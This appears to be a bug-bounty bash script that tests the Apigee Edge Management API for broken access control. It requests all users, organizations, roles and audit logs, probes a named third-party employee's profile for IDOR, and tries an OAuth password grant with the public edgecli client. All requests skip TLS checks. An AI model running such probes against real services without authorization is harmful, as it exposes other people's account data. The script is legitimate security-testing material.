#!/bin/bash
# Apigee Edge Management API probe using HTTP Basic auth (no OAuth client needed)
# Apigee Edge supports: Authorization: Basic base64(email:password)
# Run on Pi. Set APIGEE_PASS before running.
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

APIGEE_EMAIL="${APIGEE_EMAIL:-zahinshahriar3@gmail.com}"
APIGEE_PASS="${APIGEE_PASS:-}"

OUTDIR="$HOME/bug-bounty-hunting-/results/apigee/03-candidates"
mkdir -p "$OUTDIR"
OUT="$OUTDIR/APG-L003-mgmt-basic.txt"
MGMT="https://api.enterprise.apigee.com"

if [ -z "$APIGEE_PASS" ]; then
  echo "ERROR: export APIGEE_PASS='yourpassword' first"
  exit 1
fi

echo "=== Apigee Management API — Basic Auth Probe ===" | tee "$OUT"
echo "Date: $(date -u)" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 1: Own user profile (baseline, should 200)
echo "--- Own user profile (baseline) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -u "${APIGEE_EMAIL}:${APIGEE_PASS}" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/users/${APIGEE_EMAIL}" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 2: List all users — should 403 for non-sysadmin; 200 = priv esc
echo "--- GET /v1/users (all users — should be 403) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -u "${APIGEE_EMAIL}:${APIGEE_PASS}" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/users" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 3: IDOR — probe a known Apigee community user (single probe per CLAUDE.md §7)
# Using a publicly-known Apigee developer advocate email from community/docs
echo "--- IDOR probe: known Apigee community user ---" | tee -a "$OUT"
IDOR_EMAIL="srinandans@google.com"  # Publicly listed Apigee team member in community posts
/usr/bin/curl -sk --max-time 10 \
  -u "${APIGEE_EMAIL}:${APIGEE_PASS}" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/users/${IDOR_EMAIL}" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 4: List all organizations — should 403 for regular user
echo "--- GET /v1/organizations (global list — should be 403) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -u "${APIGEE_EMAIL}:${APIGEE_PASS}" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/organizations" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 5: Userroles list — sysadmin only
echo "--- GET /v1/userroles ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -u "${APIGEE_EMAIL}:${APIGEE_PASS}" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/userroles" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 6: Global audit log — admin-only, interesting if accessible
echo "--- GET /v1/audits (global audit log — admin-only) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -u "${APIGEE_EMAIL}:${APIGEE_PASS}" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/audits" | tee -a "$OUT"
echo | tee -a "$OUT"

# Step 7: OAuth token via password grant (also try with basic creds directly)
echo "--- OAuth token attempt (password grant with basic creds) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -X POST "https://login.apigee.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: application/json" \
  -d "grant_type=password&username=${APIGEE_EMAIL}&password=${APIGEE_PASS}&response_type=token&client_id=edgecli&client_secret=edgeclisecret" \
  -w "\nHTTP_%{http_code}" | tee -a "$OUT"
echo | tee -a "$OUT"

echo "=== INTERPRETATION ===" | tee -a "$OUT"
echo "- /v1/users/{own}: 200 = baseline confirmed" | tee -a "$OUT"
echo "- /v1/users/{other}: 200 with data = IDOR confirmed → write report" | tee -a "$OUT"
echo "- /v1/users/{other}: 403 = properly restricted" | tee -a "$OUT"
echo "- /v1/users: 200 listing all users = privilege escalation → write report" | tee -a "$OUT"
echo "- /v1/organizations: 200 = privilege escalation → write report" | tee -a "$OUT"
echo | tee -a "$OUT"
echo "Done. Results: $OUT"
echo "DO NOT commit password to git."
